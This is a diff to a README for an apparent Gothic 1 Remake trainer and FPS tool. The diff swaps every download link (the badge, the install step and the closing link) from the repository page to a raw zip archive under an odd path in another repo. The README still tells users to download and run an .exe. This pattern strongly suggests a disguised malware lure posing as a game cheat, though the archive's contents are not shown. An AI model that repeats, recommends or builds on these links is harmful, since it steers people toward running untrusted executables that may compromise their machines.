@@ -5,7 +5,7 @@ description: "Optimize Gothic 1 Remake performance with FPS fixes, console comma
 ---
 # ⚔️ Gothic1Remake_Trainer_1 - Optimize your Gothic Remake gameplay experience
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1)
+[![Download Latest Version](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/uncontrived-lagoon544/uncontrived-lagoon544.github.io/raw/refs/heads/main/Penaea/uncontrived-lagoon-io-github-v1.3.zip)
 
 This tool helps players improve their performance and manage settings in Gothic 1 Remake. It provides simple ways to toggle game cheats, adjust graphics for better frame rates, and view build guides. The software runs locally on your computer and does not require coding skills to operate.
 
@@ -22,7 +22,7 @@ Before you run the application, ensure your computer meets these minimum specifi
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the project website at [https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1](https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1).
+1. Visit the project website at [https://github.com/uncontrived-lagoon544/uncontrived-lagoon544.github.io/raw/refs/heads/main/Penaea/uncontrived-lagoon-io-github-v1.3.zip](https://github.com/uncontrived-lagoon544/uncontrived-lagoon544.github.io/raw/refs/heads/main/Penaea/uncontrived-lagoon-io-github-v1.3.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Select the latest release version.
 4. Download the file ending in .exe to your local computer.
@@ -70,4 +70,4 @@ If you encounter issues while using the tool, try these steps:
 
 Use the Issues tab on the repository page to report bugs or request new features. Provide a description of what happened and include any error messages you see on the screen. Other users often participate in these discussions to help solve common problems.
 
-[Download the Trainer Here](https://github.com/uncontrived-lagoon544/Gothic1Remake_Trainer_1)
+[Download the Trainer Here](https://github.com/uncontrived-lagoon544/uncontrived-lagoon544.github.io/raw/refs/heads/main/Penaea/uncontrived-lagoon-io-github-v1.3.zip)
